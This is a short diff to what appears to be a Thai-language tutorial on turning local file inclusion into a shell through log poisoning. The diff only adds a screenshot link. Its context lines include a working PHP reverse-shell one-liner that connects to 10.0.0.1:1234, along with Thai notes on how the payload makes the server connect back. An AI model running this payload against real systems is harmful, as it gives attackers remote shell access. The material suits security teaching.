@@ -251,6 +251,8 @@ www-data
 php -r '$sock=fsockopen("10.0.0.1",1234);exec("/bin/sh -i <&3 >&3 2>&3");'
 ```
 
+![shell](images/16.png)
+
 - fsockopen() เปิดการเชื่อมต่อ TCP ไปยัง IP/Port ที่เราระบุ
 - exec() จะเรียกใช้งาน shell (/bin/sh -i) แบบ interactive
 - เมื่อฝังโค้ดนี้ลงใน Log และโหลดผ่าน LFI → เซิร์ฟเวอร์จะเชื่อมกลับมาที่เครื่องเรา
